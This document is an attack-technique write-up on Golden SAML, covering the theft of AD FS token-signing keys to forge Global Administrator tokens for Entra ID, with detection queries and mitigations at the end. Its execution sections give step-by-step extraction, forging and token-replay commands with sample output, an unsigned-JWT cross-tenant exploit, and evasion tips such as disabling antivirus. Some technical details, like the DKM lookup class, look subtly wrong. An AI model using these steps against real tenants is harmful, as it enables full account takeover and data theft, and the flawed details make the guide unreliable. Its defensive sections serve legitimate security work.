# [CA-FORGE-001]: Golden SAML - AD FS Token Forging

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | CA-FORGE-001 |
| **MITRE ATT&CK v18.1** | [T1606.002: Forge Web Credentials: SAML Tokens](https://attack.mitre.org/techniques/T1606/002/) |
| **Tactic** | Credential Access |
| **Platforms** | Hybrid M365 (AD FS + Entra ID) |
| **Severity** | Critical |
| **CVE** | CVE-2021-26906 (Predecessor); Related: CVE-2025-55241 (Actor Token Forgery) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | AD FS 2019, AD FS 4.0 (Windows Server 2016/2019/2022) when Entra Connect hybrid configured |
| **Patched In** | Ongoing via certificate rotation policies, Hardware Security Module (HSM) enforcement, audit controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Golden SAML is exclusive to hybrid environments with AD FS. Pure cloud (Entra ID only) environments are NOT affected. Atomic Red Team tests not applicable (requires AD FS lab setup).

---

## 2. Executive Summary

**Concept:** Golden SAML is a privilege escalation attack targeting federated identity environments. When an organization uses **Active Directory Federation Services (AD FS)** to federate with Microsoft Entra ID, AD FS cryptographically signs SAML tokens using a private key stored in a Distributed Key Management (DKM) store. If an attacker obtains the AD FS token-signing certificate and its private key, they can forge SAML tokens claiming any identity (including Global Administrators) without knowing passwords or having access to MFA devices. These forged tokens are accepted by Entra ID as legitimate, granting the attacker unrestricted access to M365 services.

**Attack Surface:** The attack surface includes the AD FS server itself (requires Domain Admin access to extract certificates), the Active Directory DKM container (holds encrypted token-signing keys), and the trust relationship between AD FS and Entra ID. Compromise requires either:
1. **Domain Admin access** to AD FS server (via prior lateral movement)
2. **Physical access** to AD FS server to extract credentials
3. **Exploitation of AD FS service account** (if running with extractable credentials)

**Business Impact:** **Full tenant compromise with unrestricted administrative access.** An attacker who forges a Global Administrator SAML token can create backdoor accounts, disable MFA, exfiltrate all data, modify security policies, and establish persistent access across M365. Unlike other attacks (credential theft, MFA bypass), Golden SAML leaves minimal audit traces, making detection exceptionally difficult and investigation time-intensive.

**Technical Context:** Golden SAML is typically the culmination of a sophisticated attack chain. The attacker first compromises on-premises Active Directory (via phishing, credential theft, or supply-chain compromise), escalates to Domain Admin, then pivots to the AD FS server to extract cryptographic material. The attack's sophistication explains why it was weaponized in the SolarWinds compromise and why organizations with hybrid setups remain at elevated risk.

### Operational Risk

- **Execution Risk:** Medium-High. Requires Domain Admin on-premises; high barrier but achievable via standard lateral movement after initial compromise.
- **Stealth:** Very High. Forged SAML tokens bypass audit trails; no AD FS event log entries correlate with cloud sign-ins. Appears as legitimate Entra ID authentication.
- **Reversibility:** No. Once private key compromised, attacker maintains indefinite access until certificate rotated. Attacking "becomes owner" of federation trust.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.1 (Certificate Management), 6.1 (Privileged Access) | AD FS certificates not secured in HSM; Domain Admin unrestricted access to private keys. |
| **DISA STIG** | IA-5(2)(d) | Public key infrastructure (PKI) must protect private keys; AD FS keys stored in software-based DKM. |
| **CISA SCuBA** | MS.FEDRAMP.04 | Hybrid identity: Require HSM-backed certificate storage for federation. |
| **NIST 800-53** | AU-7 (Audit Reduction), SC-12 (Cryptographic Key Establishment) | AD FS audit logs insufficient to detect forged tokens; keys not in tamper-proof storage. |
| **GDPR** | Art. 32 (Security of Processing) | Failure to implement technical measures (HSM, key protection) for identity layer. |
| **NIS2** | Art. 21 (Multi-factor Authentication) | Hybrid infrastructure must protect federated authentication channels; compromise of AD FS violates principle. |
| **ISO 27001** | A.10.1 (Cryptographic Controls), A.9.2.2 (Access Rights Management) | Private keys not in secure enclave; no revocation mechanism for forged tokens. |
| **SOC 2 Type II** | 7.2 (System Monitoring) | Failure to detect unauthorized token generation/use during audit period. |

---

## 3. Technical Prerequisites

**Required Privileges:**
- **For certificate extraction:** Domain Admin on-premises (or compromise AD FS service account).
- **For key decryption:** Access to AD FS DKM key (stored in Active Directory; Domain Admin or read access to DN `CN=ADFS,CN=Microsoft,CN=Program Files,CN=Common Files`).

**Required Access:**
- Network access to AD FS server (from compromised on-prem machine).
- Direct access to Active Directory domain controller (for DKM extraction).
- (Optional) Network access to Entra ID login endpoints from forged token source.

**Supported Versions:**
- **AD FS:** 2019, 2016, Windows Server 2022 (all versions vulnerable to certificate compromise).
- **Entra ID:** All tenants (no version restrictions; vulnerability is trust-based, not software).
- **Entra Connect:** All versions (hybrid scenarios).

**Tools:**
- [AADInternals](https://github.com/Gerenios/AADInternals) – PowerShell module; extracts AD FS certificates and forges SAML tokens.
- [ADFSDump](https://github.com/mandiant/ADFSDump) – Command-line utility; extracts token-signing certificate from AD FS.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) – Extracts DPAPI master key for DKM decryption.
- [ADFSpoof](https://github.com/mandiant/ADFSpoof) – Forges SAML responses and submits to relying parties.

---

## 4. Environmental Reconnaissance

### Step 1: Identify AD FS Configuration and Federation Trust

**Objective:** Determine if organization uses AD FS + Entra ID hybrid setup (required for Golden SAML).

**Command (PowerShell - Check AD FS Trust):**
```powershell
# From any domain-joined computer
Get-AdfsProperties | Select-Object HostName, FederationServiceName, Identifier

# Output:
# HostName: adfs.company.com
# FederationServiceName: company.com
# Identifier: https://adfs.company.com/adfs/services/trust
```

**Command (Entra ID - Verify Federation):**
```powershell
Connect-MgGraph
Get-MgOrganization | Select-Object ComplianceExposure, IsMultiTenantOrg, DirSyncEnabled

# If hybrid: DirSyncEnabled = true, and federation is active
```

**What to Look For:**
- **AD FS hostname** and **FederationServiceName** (identifies federation server).
- **DirSyncEnabled** = true (indicates hybrid setup).
- If AD FS found: Vulnerability exists (unless mitigations in place).

**OpSec & Evasion:** Queries generate no logs if performed from compromised domain-joined machine.

---

### Step 2: Locate AD FS Token-Signing Certificate

**Objective:** Identify the AD FS server and certificate storage location.

**Command (PowerShell - List AD FS Certificates):**
```powershell
# Requires Domain Admin or AD FS admin access
$adfsServer = "ADFS01.company.com"

Invoke-Command -ComputerName $adfsServer -ScriptBlock {
    Get-AdfsCertificate -CertificateType Token-Signing | Select-Object Thumbprint, NotBefore, NotAfter
}

# Output:
# Thumbprint: ABC123...
# NotBefore: 2024-01-01
# NotAfter: 2026-01-01
```

**What to Look For:**
- **Thumbprint** of token-signing certificate (used for extraction).
- **Certificate validity period** (longer expiration = longer persistence if stolen).
- Number of token-signing certificates (active + previous).

**OpSec & Evasion:** Certificate enumeration generates access logs on AD FS server (detectable).

---

## 5. Detailed Execution Methods

### METHOD 1: Extract Token-Signing Certificate via ADFSDump (Domain Admin)

**Objective:** Extract AD FS token-signing certificate and private key using ADFSDump.

**Prerequisites:** Domain Admin privileges or AD FS admin access.

#### Step 1: Prepare AD FS Server Access

**Command (Gain AD FS Admin Context):**
```powershell
# If already Domain Admin, directly access AD FS

# If not DA but AD FS admin:
$credential = Get-Credential  # Enter AD FS admin credentials
Invoke-Command -ComputerName ADFS01.company.com -Credential $credential -ScriptBlock {
    # Will execute subsequent steps in AD FS admin context
}
```

---

#### Step 2: Export Token-Signing Certificate via ADFSDump

**Command (ADFSDump - Extract Certificate):**
```bash
# On AD FS server or via remote PowerShell session
# Requires Administrator privileges on AD FS server

wget https://github.com/mandiant/ADFSDump/releases/download/v1.0/ADFSDump.exe
.\ADFSDump.exe

# Output will display:
# [*] Token Signing Certificate:
#     Thumbprint: ABC123...
#     Subject: CN=ADFS Signing, O=Company, C=US
#     Public Key: ...
#     Private Key (ENCRYPTED): ...
#
# [*] DKM Key found in: CN=ADFS,CN=Microsoft,CN=Program Files,...
```

**Expected Output:**
```
[*] Connecting to AD FS database
[*] Reading configuration from AD FS
[*] Extracting token-signing certificate
[+] Certificate extracted successfully

Thumbprint: ABC123DEF456...
Subject: CN=ADFS Signing
Issuer: CN=ADFS Signing
Public Key Algorithm: RSA
Public Key Size: 2048
Private Key: ENCRYPTED (DPAPI)

[+] DKM Key location: AD://CN=ADFS,CN=Microsoft,...
```

**What This Means:**
- Token-signing certificate (public key) is extracted and readable.
- Private key is ENCRYPTED via DPAPI; requires DKM key for decryption.
- DKM key location identified (next step: extract from AD).

**OpSec & Evasion:**
- **Detection Likelihood: High.** ADFSDump requires elevated privileges; execution logged by Windows Defender.
- **Mitigation:** Disable AV temporarily (detectable); use code obfuscation; execute from Privileged Access Workstation (PAW) with minimal logging.

---

#### Step 3: Extract DKM Key from Active Directory

**Objective:** Retrieve the Distributed Key Manager (DKM) key stored in AD, allowing private key decryption.

**Command (LDAP Query - Extract DKM Key):**
```powershell
# Requires read access to AD (standard domain user can perform this)
# But Domain Admin context provides guaranteed access

$adfsContainer = Get-ADObject -Filter "ObjectClass -eq 'msFVE-RecoveryInformation'" -SearchBase "CN=ADFS,CN=Microsoft,CN=Program Files,CN=Common Files,CN=System,$((Get-ADDomain).DistinguishedName)"

# Alternative: Use LDAP directly
$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry "LDAP://CN=ADFS,CN=Microsoft,CN=Program Files,CN=Common Files,CN=System,..."
$dkmObject = $ldapConnection.Children | Where-Object { $_.Name -like "*DKM*" }
$dkmKey = $dkmObject.Properties["msFVE-RecoveryInformation"][0]

Write-Host "DKM Key: $dkmKey"
```

**Expected Output:**
```
[+] DKM Key found: F3E2D1C0B9A8...
[+] Key is base64-encoded and DPAPI-encrypted
```

**What This Means:**
- DKM key retrieved from AD.
- Key is encrypted via DPAPI (tied to machine key of AD FS server).
- Decryption requires either AD FS server machine key or DPAPI master key extraction (Mimikatz).

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** LDAP query for DKM may be logged by advanced AD monitoring.
- **Mitigation:** Perform query during high-activity period to blend with normal traffic.

---

#### Step 4: Decrypt Private Key Using DKM Key (Mimikatz)

**Command (Mimikatz - DPAPI Decryption):**
```bash
# On AD FS server with local admin access
mimikatz.exe

mimikatz # dpapi::capi

mimikatz # dpapi::masterkey /in:C:\ProgramData\Microsoft\Windows\Crypto\RSA\S-1-5-... /pvk:...

# Output will show decrypted private key
```

**Expected Output:**
```
[+] Private Key Decrypted:
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...
(PEM-formatted RSA private key)
```

**What This Means:**
- Token-signing certificate private key is now in plaintext.
- Attacker can use this key to sign forged SAML tokens.
- Private key valid for multiple years (until certificate expires or rotated).

---

### METHOD 2: Forge SAML Token Using AADInternals

**Objective:** Create a forged SAML token claiming to be a Global Administrator.

**Prerequisites:** Extracted token-signing certificate private key from Step 1.

#### Step 1: Prepare Forged Token Parameters

**Command (PowerShell - Gather Required Attributes):**
```powershell
# Import AADInternals
Import-Module AADInternals

# Get target user details
$targetUser = "admin@company.com"
$tenantId = (Get-MgOrganization).Id
$targetUserUPN = "admin@company.com"

# Get target user's ObjectGUID (ImmutableID)
# This requires AD access
$adUser = Get-ADUser -Filter "UserPrincipalName -eq '$targetUserUPN'" -Properties ObjectGUID
$immutableId = [Convert]::ToBase64String($adUser.ObjectGUID.ToByteArray())

Write-Host "Target: $targetUser"
Write-Host "ImmutableID: $immutableId"
Write-Host "TenantID: $tenantId"
```

**Expected Output:**
```
Target: admin@company.com
ImmutableID: AbCdEfGhIjKlMnOpQrStUvWxYz==
TenantID: 12345678-1234-1234-1234-123456789012
```

**What to Look For:**
- **ImmutableID:** Base64-encoded ObjectGUID of target user (required for forged token).
- **TenantID:** Entra ID tenant ID (public information).
- **Target UPN:** Admin account to impersonate.

**OpSec & Evasion:** AD query may be logged; perform during business hours.

---

#### Step 2: Create Forged SAML Token via AADInternals

**Command (PowerShell - Forge SAML Token):**
```powershell
# Load extracted certificate and private key
$certPath = "C:\extracted\token-signing-cert.pfx"
$certPassword = ConvertTo-SecureString "password" -AsPlainText -Force
$cert = Get-PfxCertificate -FilePath $certPath

# Use AADInternals to forge SAML token
$samlToken = New-AADIntSAMLToken `
    -IssuerUrl "https://adfs.company.com/adfs/services/trust" `
    -Audience "https://login.microsoftonline.com/12345678-1234.../saml2" `
    -UserPrincipalName "admin@company.com" `
    -ImmutableId "AbCdEfGhIjKlMnOpQrStUvWxYz==" `
    -Certificate $cert `
    -TenantId "12345678-1234-1234-1234-123456789012" `
    -NotOnOrAfter (Get-Date).AddYears(10)  # Validity: 10 years for persistence

Write-Host "Forged SAML Token:`n$samlToken"
```

**Expected Output:**
```xml
<saml:Assertion Version="2.0" ID="..." IssueInstant="2025-01-08T12:00:00Z">
  <saml:Issuer>https://adfs.company.com/adfs/services/trust</saml:Issuer>
  <saml:Subject>
    <saml:NameID>admin@company.com</saml:NameID>
  </saml:Subject>
  <saml:Conditions NotBefore="..." NotOnOrAfter="2035-01-08...">
    <saml:AudienceRestriction>
      <saml:Audience>https://login.microsoftonline.com/12345678.../saml2</saml:Audience>
    </saml:AudienceRestriction>
  </saml:Conditions>
  <saml:AuthnStatement>...</saml:AuthnStatement>
  <ds:Signature>
    <ds:SignatureValue>ABC123DEF456...=</ds:SignatureValue>  <!-- Signed with stolen private key -->
  </ds:Signature>
</saml:Assertion>
```

**What This Means:**
- **SAML token forged** and cryptographically signed with stolen private key.
- **NotOnOrAfter:** Token valid for 10 years (long-term persistence).
- **Issuer:** Appears to be legitimate AD FS server.
- **Signature:** Valid signature ensures Entra ID accepts token without verification.

**Token Breakdown:**
- **NameID:** Impersonated user (admin@company.com).
- **Audience:** Entra ID login endpoint.
- **Conditions:** Token lifetime and validity constraints.
- **AuthnStatement:** Authentication proof (forged; no actual authentication occurred).

**OpSec & Evasion:**
- **Detection Likelihood: Low during generation.** Token creation happens locally; no network activity.
- **Detection at use time: High** if monitoring for unusual sign-ins (different IP, location, etc.).

---

#### Step 3: Replay Forged SAML Token to Authenticate to Entra ID

**Objective:** Submit forged SAML token to Entra ID and obtain access token.

**Command (cURL - Submit SAML Token to Entra ID):**
```bash
# Prepare SAML token for POST request
SAML_TOKEN="PD94bWwgdmVyc2lvbj0iMS4wIj8+PFNBTUxBc3NlcnRpb24..."  # Base64-encoded forged token

# Submit to Entra ID SAML endpoint
curl -i -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "SAMLResponse=$SAML_TOKEN&RelayState=AADB2" \
  "https://login.microsoftonline.com/12345678-1234-1234-1234-123456789012/saml2"
```

**Expected Response:**
```
HTTP/1.1 302 Found
Location: https://myapps.microsoft.com/?SAMLAuthenticationTokenReceived=true

Set-Cookie: ESTSAUTHPERSISTENT=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ...
Set-Cookie: ESTSAUTH=...
```

**What This Means:**
- Entra ID accepted forged SAML token as legitimate.
- Session cookies (ESTSAUTH, ESTSAUTHPERSISTENT) issued.
- Attacker now authenticated as Global Administrator.
- MFA, Conditional Access, and other defenses BYPASSED.

**OpSec & Evasion:**
- **Detection Likelihood: Very High at use time.** Unusual sign-in from non-expected location/IP triggers risk alerts.
- **Mitigation:** Use from compromised internal machine or VPN (blends with legitimate traffic); submit token to less-monitored resource first.

---

#### Step 4: Access M365 Services with Forged Admin Identity

**Command (PowerShell - Connect as Impersonated Admin):**
```powershell
# Set session cookies from SAML authentication
$headers = @{
    "Authorization" = "Bearer $accessToken"  # Access token from SAML response
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)..."
}

# Access Microsoft Graph as Global Admin
$adminInfo = Invoke-RestMethod `
    -Uri "https://graph.microsoft.com/v1.0/me/memberOf" `
    -Headers $headers

Write-Host "Groups: $($adminInfo.value | Select-Object displayName)"

# Output will show Global Administrator role is present
```

**Expected Output:**
```
Groups:
  - Global Administrator
  - Company Administrator
  - User Administrators
  - Privileged Role Administrator
```

**What This Means:**
- Forged token accepted by Microsoft Graph.
- Attacker now has full Global Administrator privileges.
- Can modify conditional access, disable MFA, create backdoors, etc.

---

### METHOD 3: Use Actor Token Forgery (CVE-2025-55241 - Cross-Tenant Attack)

**Objective:** Exploit CVE-2025-55241 to forge actor tokens and impersonate users across tenant boundaries.

**Note:** This attack differs from Golden SAML; includes cross-tenant compromise potential.

**Prerequisites:** Basic Entra ID access in attacker's own tenant (legitimate account).

#### Step 1: Craft Actor Token Payload

**Command (Python - Create Actor Token):**
```python
import jwt
import json
from datetime import datetime, timedelta

# Actor token payload (JWT)
payload = {
    "iss": "https://sts.windows.net/attacker-tenant-id/",
    "aud": "https://graph.microsoft.com",
    "sub": "attacker@attacker-tenant.com",
    "oid": "attacker-object-id",
    "tid": "attacker-tenant-id",
    "iat": int(datetime.utcnow().timestamp()),
    "exp": int((datetime.utcnow() + timedelta(hours=1)).timestamp()),
    "scp": ["Directory.Read.All", "User.Read.All"],
    "appid": "00000003-0000-0000-c000-000000000000"  # Graph App ID
}

# Sign with attacker's token (if available) or unsigned (exploit)
# CVE-2025-55241: Azure AD Graph API accepts unsigned tokens
token_unsigned = jwt.encode(payload, "", algorithm="none")

print(f"Actor Token (Unsigned): {token_unsigned}")
```

**Expected Output:**
```
Actor Token (Unsigned): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9hdHRhY2tlci10ZW5hbnQtaWQvIi...
```

**What This Means:**
- Actor token created as unsigned JWT.
- Payload contains tenant ID, user claims, and scopes.
- Unsigned token exploits Azure AD Graph API validation failure.

---

#### Step 2: Replay Actor Token to Access Other Tenant

**Command (cURL - Cross-Tenant Impersonation):**
```bash
# Change tenant ID in API call to victim tenant
ATTACKER_TOKEN="eyJhbGciOiJub25lIi..."
VICTIM_TENANT_ID="victim-tenant-id"

# Request access to victim tenant resource
curl -i -X GET \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "X-Tenant-Id: $VICTIM_TENANT_ID" \
  "https://graph.microsoft.com/v1.0/tenants/$VICTIM_TENANT_ID/users"
```

**Expected Response:**
```
HTTP/1.1 200 OK
{
  "value": [
    {
      "id": "user-id",
      "displayName": "Global Administrator",
      "userPrincipalName": "admin@victim-company.com"
    }
  ]
}
```

**What This Means:**
- Victim tenant user information exposed via cross-tenant actor token.
- Attacker can query any tenant (if tenant ID known, publicly available).
- Potential for data exfiltration or further exploitation.

**OpSec & Evasion:**
- **Detection Likelihood: Medium.** Actor token usage may generate anomalous Graph API logs.
- **Mitigation:** Microsoft patched CVE-2025-55241 in September 2025; verify patch applied.

---

## 6. Tools & Commands Reference

### AADInternals

**Version:** Latest (4.9+)
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell 7.0+

**Installation:**
```powershell
Install-Module AADInternals
Import-Module AADInternals
```

**Usage:**
```powershell
# Extract AD FS configuration
Get-AADIntADFSSyncCredentials

# Forge SAML token
$token = New-AADIntSAMLToken -Certificate $cert ...

# Get user details for impersonation
Get-AADIntUser -Identity "admin@company.com"
```

---

### ADFSDump

**Version:** 1.0+
**Supported Platforms:** Windows (requires ADFS server access)

**Installation:**
```bash
wget https://github.com/mandiant/ADFSDump/releases/download/v1.0/ADFSDump.exe
chmod +x ADFSDump.exe
```

---

## 7. Microsoft Sentinel Detection

#### Query 1: Forged SAML Token Detection - Missing AD FS Audit Trail

**KQL Query:**
```kusto
SigninLogs
| where FederatedCredentialUsed == true
| where ResultType == 0  // Successful sign-in
| join kind=leftanti (
    Event
    | where Source == "AD FS"
    | where EventID == 1200 or EventID == 1202  // AD FS authentication events
    | project CorrelationId_ADFS = CorrelationId, TimeGenerated
) on $left.CorrelationId == $right.CorrelationId_ADFS
| where TimeGenerated > ago(24h)
| project UserPrincipalName, CorrelationId, IPAddress, LocationDetails.countryOrRegion
```

**What This Detects:**
- Successful Entra ID sign-in via federation.
- NO corresponding AD FS authentication event (Event ID 1200/1202).
- Indicates forged SAML token (bypassed AD FS authentication flow).

---

#### Query 2: Suspicious Certificate Export from AD FS

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 33205  // AD FS certificate export attempt
| project TimeGenerated, Computer, Account, EventData
| where EventData contains "Token-Signing"
```

**What This Detects:**
- Attempts to export token-signing certificate from AD FS WID/SQL.
- Event ID 33205 indicates unauthorized certificate access.

---

## 8. Windows Event Log Monitoring

**Event ID: 33205 (AD FS Certificate Export Attempt)**
- **Log Source:** AD FS (Windows Internal Database or SQL Server audit log)
- **Trigger:** Account different from AD FS service account queries certificate store.
- **Action:** Investigate immediately; potential credential compromise.

**Event ID: 4662 (Active Directory DS Access - DKM Key Query)**
- **Log Source:** Domain Controller Security Log
- **Trigger:** Non-standard account reads AD FS DKM container.
- **Action:** Correlate with AD FS server compromises.

---

## 9. Detection & Incident Response

#### Indicators of Compromise

**AD FS Server Logs:**
- Certificate export events (Event ID 33205).
- Unusual LDAP queries for DKM key (4662 events on DC).
- AD FS service account logon from non-standard machines.

**Entra ID Logs:**
- Sign-in without corresponding AD FS Event 1200/1202.
- Successful Entra ID sign-in followed immediately by sensitive operations (user creation, MFA disable).
- Admin sign-ins from unusual locations (especially off-hours).

**Network:**
- Outbound HTTPS from AD FS server to attacker IP (suspicious).
- Repeated SAML POST requests from single IP address to Entra ID (token replay).

---

#### Forensic Artifacts

**AD FS Server:**
- `C:\ProgramData\Microsoft\ADFS\Data\` – AD FS configuration and DKM references.
- Windows Event Viewer: AD FS admin log for certificate operations.
- Registry: `HKEY_LOCAL_MACHINE\Software\Microsoft\ADFS\` – Certificate thumbprints.

**Domain Controller:**
- AD FS DKM container: `CN=ADFS,CN=Microsoft,CN=Program Files,...`
- Security Event Log: Event ID 4662 (AD object access).

---

#### Immediate Containment

**Command (Rotate Token-Signing Certificate - CRITICAL):**
```powershell
# On AD FS server - Rotate certificate TWICE to invalidate all forged tokens
# Rotation 1
Update-AdfsCertificate -CertificateType Token-Signing -AutoCertificateRollover $true

# Wait 5 minutes
Start-Sleep -Seconds 300

# Rotation 2 (invalidates first rotation)
Update-AdfsCertificate -CertificateType Token-Signing -AutoCertificateRollover $true

# Verify new certificate active
Get-AdfsCertificate -CertificateType Token-Signing
```

**Expected Output:**
```
Thumbprint: ABC123... (NEW)
NotBefore: 2025-01-08
NotAfter: 2027-01-08
Status: Active
```

**What This Accomplishes:**
- All forged tokens signed with old certificate invalidated.
- Attacker must re-extract certificate to continue compromise.
- Provides time for incident response and access log review.

---

## 10. Defensive Mitigations

#### Priority 1: CRITICAL

- **Require Hardware Security Module (HSM) for Token-Signing Certificate:**
  - Private key stored in tamper-proof HSM; cannot be exported even by Domain Admin.
  - Requires re-issue of certificate.
  
  **Manual Steps:**
  1. Procure HSM (e.g., Thales HSM, Azure Key Vault HSM).
  2. Generate new token-signing certificate in HSM.
  3. Import certificate into AD FS.
  4. Disable export of old certificate (Group Policy).
  5. Retire non-HSM token-signing certificates.

- **Enforce Automated Certificate Rotation:**
  - Rotate token-signing certificate every 6 months (reduces attacker window).
  - Disable manual certificate management (prevent abuse by rogue admins).
  
  **Manual Steps:**
  1. **AD FS Server**:
     ```powershell
     Set-AdfsCertificateAutoRollover -Enable $true -DaysBeforeExpiry 30
     ```
  2. Monitor certificate expiration; ensure rotation occurs automatically.

- **Restrict Domain Admin Access to AD FS Server:**
  - Implement Just-In-Time (JIT) admin access.
  - Require MFA for AD FS server access.
  - Log all admin sessions (enable SIEM forwarding).
  
  **Manual Steps (Privileged Access Workstation):**
  1. Create PAW for AD FS administration.
  2. Require second-person approval for AD FS changes.
  3. All administrative sessions logged to Sentinel.

---

#### Priority 2: HIGH

- **Enable Advanced AD FS Auditing:**
  - Log all AD FS authentication events, certificate access, and configuration changes.
  - Forward logs to Sentinel for correlation.
  
  **Manual Steps:**
  1. **Group Policy** → `Computer Configuration` → `Administrative Templates` → `AD FS`
  2. Enable: `Audit Application Generated Events`
  3. Set audit level: **Maximum** (all sign-in events logged)
  4. Configure **Windows Event Log** subscription to forward to Sentinel

- **Monitor AD FS to Entra ID Trust Relationship:**
  - Alert if trust certificate is replaced or federation settings modified.
  - Alert if DKM key access detected.

- **Implement Conditional Access Policies for Federated Users:**
  - Block sign-ins from unusual locations (even with valid SAML token).
  - Require device compliance for admin role activation.

---

#### Priority 3: MEDIUM

- **Disable Legacy Azure AD Graph API:**
  - Migrate applications to Microsoft Graph API (newer, more secure).
  - Disable Azure AD Graph endpoints at tenant level.
  
  **Manual Steps:**
  1. **Azure Portal** → **Azure AD** → **API Permissions**
  2. Audit all apps using Azure AD Graph API
  3. Force migration to Microsoft Graph
  4. Disable legacy endpoints (if possible)

- **Require Passwordless Admin Authentication:**
  - Global Administrators must use FIDO2 keys or Windows Hello.
  - Reduces value of stolen credentials or forged tokens (attacker must also compromise admin device).

**Validation Command:**
```powershell
# Verify HSM in use
$cert = Get-AdfsCertificate -CertificateType Token-Signing
if ($cert.PrivateKeyProvider -like "*HSM*") {
    Write-Host "[+] Token-signing certificate protected by HSM"
} else {
    Write-Host "[-] WARNING: Certificate not in HSM"
}

# Verify certificate rotation
Get-AdfsCertificate -CertificateType Token-Signing | Select-Object NotBefore, NotAfter | ForEach-Object {
    $age = (Get-Date) - $_.NotBefore
    if ($age.Days -gt 180) {
        Write-Host "[-] Certificate over 6 months old; rotation recommended"
    } else {
        Write-Host "[+] Certificate age acceptable: $($age.Days) days"
    }
}
```

---

## 11. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Spear Phishing | Attacker targets domain user or admin. |
| **2** | **Lateral Movement** | [LM-PRIV-001] Credential Theft / Kerberoasting | Attacker obtains domain credentials. |
| **3** | **Privilege Escalation** | [PE-ADMIN-001] Domain Admin Compromise | Attacker escalates to Domain Admin. |
| **4** | **Credential Access - This Step** | **[CA-FORGE-001] Golden SAML** | Attacker extracts token-signing certificate. |
| **5** | **Lateral Movement to Cloud** | [LM-AUTH-008] Entra ID Global Admin Impersonation | Attacker forges SAML token as GA. |
| **6** | **Persistence** | Create backdoor admin account, disable MFA | Attacker ensures long-term access. |
| **7** | **Impact** | Full M365 data exfiltration | Attacker steals sensitive data. |

---

## 12. Real-World Examples

#### Example: SolarWinds Supply Chain Attack (2020)

- **Target Sector:** Government, Fortune 500 companies.
- **Timeline:** Discovered December 2020.
- **Technique Status:** ACTIVE (Golden SAML was post-exploitation technique).
- **TTP Sequence:**
  1. SolarWinds Orion platform compromised upstream.
  2. Trojanized software distributed to thousands of organizations.
  3. APT29 (attacker) gained initial access to customer networks.
  4. Lateral movement to Domain Admin.
  5. Golden SAML: AD FS token-signing certificate extracted.
  6. Entra ID Global Administrator account impersonated.
  7. M365 and sensitive government systems compromised (including U.S. Treasury, Commerce, Homeland Security).
- **Impact:** 18+ months of undetected access; full data exfiltration; estimated recovery cost $10B+.
- **Reference:** [Microsoft SolarWinds Incident Report](https://www.microsoft.com/security/blog)

---

## 13. Summary

**Golden SAML represents the most dangerous post-compromise attack in hybrid M365 environments.** Once an attacker obtains the AD FS token-signing certificate, they become the "owner" of the federation trust, with indefinite access to the cloud tenant until the certificate is rotated. The attack is exceptionally difficult to detect because forged SAML tokens appear as legitimate Entra ID authentications, bypassing all security controls (MFA, Conditional Access, device compliance).

**Defense requires:**

1. **Hardware-backed certificate storage (HSM):** Prevents private key export.
2. **Automated certificate rotation:** Regular certificate updates limit attacker window.
3. **Restricted Domain Admin access:** JIT/PAW limits exposure of administrator credentials.
4. **Advanced auditing and monitoring:** Detect certificate export, unusual admin access, and forged sign-ins.
5. **Conditional Access at cloud layer:** Blocks sign-ins from anomalous locations, even with valid tokens.

Organizations with hybrid setups should prioritize HSM deployment and certificate rotation as the top priority for preventing Golden SAML attacks.